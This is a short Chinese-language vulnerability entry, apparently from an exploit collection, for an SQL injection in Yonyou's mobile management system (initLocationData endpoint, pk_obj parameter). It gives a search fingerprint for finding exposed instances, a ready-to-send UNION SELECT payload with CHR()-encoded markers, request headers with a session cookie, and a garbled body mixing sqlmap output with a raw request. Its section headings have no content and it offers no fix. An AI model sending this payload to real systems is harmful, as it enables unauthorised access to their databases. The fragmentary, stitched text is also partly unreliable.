# 用友移动管理系统initLocationData存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-移动系统管理"`
- **请求**：`POST /maportal/appmanager/initLocationData?pk_obj=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2877%29%7C%7CCHR%28114%29%7C%7CCHR%2865%29%7C%7CCHR%2898%29%7C%7CCHR%28119%29%7C%7CCHR%28103%29%7C%7CCHR%28116%29`
- **关键头**：`Host: {hostname}`　`Cookie: JSESSIONID=D3CDA75976CF4C0F156A83481DE4FB22.server`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 1`

**请求体 / payload**
```
=
qpjqqMrAbwgtbIQyiZdBKsQSRKdssLFshkcipicbaNMxaqvkqq
sqlmap
POST /maportal/appmanager/initLocationData?pk_obj=1 HTTP/1.1
Host: {hsotname}
Cookie: JSESSIONID=D3CDA75976CF4C0F156A83481DE4FB22.server
Content-Type: application/x-www-form-urlencoded
Content-Length: 1
=
```

**其他**
- 用友移动管理系统initLocationData存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友移动系统管理系统